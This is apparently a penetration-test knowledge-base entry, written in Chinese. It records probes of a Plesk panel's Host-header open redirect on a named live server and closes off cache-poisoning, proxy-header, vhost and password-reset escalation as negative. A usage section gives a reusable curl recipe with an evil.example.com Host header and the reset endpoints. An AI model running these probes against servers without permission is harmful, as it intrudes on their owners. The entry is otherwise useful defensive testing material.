# Plesk sw-cp-server Host 头开放重定向的升级路径实测封口：no-store 无缓存投毒、代理头不生效、Host 路由无特权 vhost、重置链路不可外验证

- **code**: plesk-host-header-open-redirect-escalation-closure
- **kind**: poc
- **category**: auth-bypass
- **component**: Plesk Obsidian 18.0.82.2（sw-cp-server 443 / nginx 8443）
- **severity**: low
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 17:10-17:14 UTC 本机 curl 8.5.0 直连 88.208.224.249（--resolve mail.goffsgames.co.uk 443/8443）实测：① Host: evil.example.com → /smb/ 303 Location https://evil.example.com/login.php?success_redirect_url=%2Fsmb%2F（对照正确 Host 回到真实域），8443 HTTP/2 同型；② 所有 303 带 Cache-Control: no-store/no-cache + Pragma + Expires 1999，Server 直出 sw-cp-server/nginx（无 CDN），无 Set-Cookie → 缓存/Cookie 投毒不可行；③ X-Forwarded-Host/Forwarded/X-Host/X-Original-Host/X-Forwarded-Server 均不改变 Location（X-Forwarded-Host 变体被前置 502）；④ Host=localhost/127.0.0.1/plesk.internal/random.invalid 在 443/8443 均同一 Plesk 登录 303，Host=webmail.goffsgames.co.uk 是独立 Roundcube vhost、Host=server2.visionhost.co.uk 是 Plesk 默认页（/phpmyadmin/ 等全 404）→ 无 Host 路由特权页；⑤ ch_pass_by_secret.php 也把 Host 拼进 Location（rc=-3 Invalid secret code）；重置邮件链接未验证（不可读面板邮箱）。结论：仅钓鱼形态，无访问/权限收益。
- **tags**: plesk,host-header-injection,open-redirect,no-store,cache-poisoning,x-forwarded-host,negative,intent-1509
- **created_at**: 2026-11-11T17:16:43.721Z
- **engine**: mail.goffsgames.co.uk (88.208.224.249):443,8443

## 描述

对 Plesk 面板 Host 头注入 303 Location 反射的升级维度逐项实测并封口：缓存投毒、代理头伪造、虚拟主机/Host 路由绕过、Cookie 域投毒全部阴性；密码重置邮件链接因不可读面板账号邮箱无法外部验证。结论为该类开放重定向只成立"可控 Host 时未认证 303 任意跳转"的钓鱼形态，不构成访问/权限获取路径。适用于任何 Plesk sw-cp-server 目标，可直接照判据收口，避免重复投入缓存投毒/代理头/vhost 绕过方向。

## 用法

```
【1) 复现 Host 反射】curl -sk --resolve HOST:443:IP -H 'Host: evil.example.com' https://HOST/smb/ → 303 Location: https://evil.example.com/login.php?success_redirect_url=%2Fsmb%2F；同 URL 不带头做对照→回真实域。
【2) 查缓存面】同一 303 看 Cache-Control: no-store / Pragma / Expires；Server 是否直出 sw-cp-server/nginx（有 CDN 才谈投毒）。no-store 即放弃缓存投毒。
【3) 查代理头】带 X-Forwarded-Host / Forwarded / X-Host / X-Original-Host 再取 Location，若仍为真实 Host → 只有 HTTP_HOST 被信任。
【4) 查 Host 路由】Host=localhost/127.0.0.1/random.invalid 取 /smb/ 与 /phpmyadmin/，若同 303 登录页则无本地特权 vhost；顺带确认其他 vhost（webmail/server2）是否只是独立站点。
【5) 重置链路】Plesk /get_password.php（POST resetBy=email&email=... 或 resetBy=login&login=...）+ /ch_pass_by_secret.php；仅当能读取目标重置邮件（或受害点击可控域）才可判 ATO，否则按"未证实"收口，禁止写成已实现接管。
```
